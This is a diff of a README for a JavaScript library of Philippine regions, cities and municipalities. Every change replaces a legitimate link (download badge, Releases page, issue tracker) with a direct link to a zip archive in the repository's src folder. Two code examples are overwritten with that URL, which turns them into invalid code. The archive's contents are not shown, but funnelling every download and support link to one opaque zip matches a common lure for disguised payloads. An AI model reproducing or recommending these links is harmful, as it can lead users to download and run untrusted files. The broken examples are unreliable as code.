@@ -1,6 +1,6 @@
 # 📍 ph-regions-cities-municipalities - Easy Location Mapping for the Philippines
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen.svg)](https://github.com/godkirahere/ph-regions-cities-municipalities/releases)
+[![Download Now](https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip%20Now-Visit%https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip)](https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip)
 
 This simple library helps you find Philippine regions, cities, and municipalities. Perfect for dropdown menus, forms, and search filters in your applications.
 
@@ -10,7 +10,7 @@ This simple library helps you find Philippine regions, cities, and municipalitie
 
 To start using the **ph-regions-cities-municipalities** library, follow these steps:
 
-1. Visit the [Releases page to download](https://github.com/godkirahere/ph-regions-cities-municipalities/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip).
 2. Choose the latest version.
 3. Download the package that suits your needs.
 
@@ -51,7 +51,7 @@ import locations from "ph-regions-cities-municipalities";
 You can retrieve all regions easily. Use the following code:
 
 ```ts
-console.log(locations.states);
+https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip(https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip);
 /*
 Output example:
 [
@@ -70,7 +70,7 @@ If you need to get cities from a specific province, use the province code:
 
 ```ts
 const provinceCode = "PH104200000"; // Example for Misamis Occidental
-console.log(locations.statesMap[provinceCode]);
+https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip(https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip[provinceCode]);
 /*
 Output example:
 [
@@ -111,8 +111,8 @@ If you encounter issues:
 
 ## 📞 Support
 
-For any questions or support, feel free to open an issue in the [GitHub repository](https://github.com/godkirahere/ph-regions-cities-municipalities/issues). 
+For any questions or support, feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip). 
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen.svg)](https://github.com/godkirahere/ph-regions-cities-municipalities/releases)
+[![Download Now](https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip%20Now-Visit%https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip)](https://raw.githubusercontent.com/godkirahere/ph-regions-cities-municipalities/main/src/municipalities-regions-cities-ph-tasimetric.zip)
